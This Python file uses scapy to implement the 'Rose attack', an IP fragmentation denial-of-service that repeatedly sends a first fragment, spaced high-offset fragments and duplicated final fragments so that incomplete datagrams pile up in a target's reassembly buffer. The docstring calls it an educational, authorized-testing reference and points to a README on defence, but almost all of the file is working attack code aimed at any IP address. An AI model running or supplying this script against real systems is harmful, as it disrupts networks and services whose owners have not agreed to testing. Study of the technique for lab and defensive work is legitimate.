#!/usr/bin/env python3
"""Rose attack: sparse high-offset fragmentation DoS demonstration.

EDUCATIONAL / AUTHORIZED-TESTING USE ONLY. Run only inside an isolated lab
network you own, or with explicit written permission. See this folder's
README.md for how the technique works and, more importantly, how to detect
and defend against it.

This is a legacy learning exercise, refactored to modern Python 3 for
readability. It is a reference implementation, not a turnkey tool.
"""

from __future__ import annotations

from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send

PAYLOAD_SIZE = 80
ROUNDS = 20
FRAGMENTS_PER_ROUND = 20
FIRST_OFFSET = 807
OFFSET_STEP = 807
FINAL_OFFSET = 16330
FINAL_FRAGMENT_COPIES = 15
ID_INCREMENT = 23


def rose_attack(target_ip: str, interface: str, dest_port: int) -> None:
    """Send a first fragment plus distant high-offset fragments, leaving gaps.

    The incomplete datagrams sit in the target's reassembly buffer until they
    time out, which is where the denial-of-service pressure comes from.
    """
    print(f"[*] Rose attack demonstration against {target_ip}")
    packet = IP(dst=target_ip) / TCP(dport=dest_port)
    payload = b"a" * PAYLOAD_SIZE

    for _round in range(ROUNDS):
        packet.flags = "MF"
        send(packet / payload, iface=interface, verbose=0)  # first fragment

        offset = FIRST_OFFSET
        for _ in range(FRAGMENTS_PER_ROUND):
            packet.frag = offset
            send(packet / payload, iface=interface, verbose=0)
            offset += OFFSET_STEP

        packet.flags = 0
        packet.frag = FINAL_OFFSET
        send(packet / payload, count=FINAL_FRAGMENT_COPIES, iface=interface, verbose=0)

        packet.id += ID_INCREMENT   # new datagram id for the next round
        packet.frag = 0
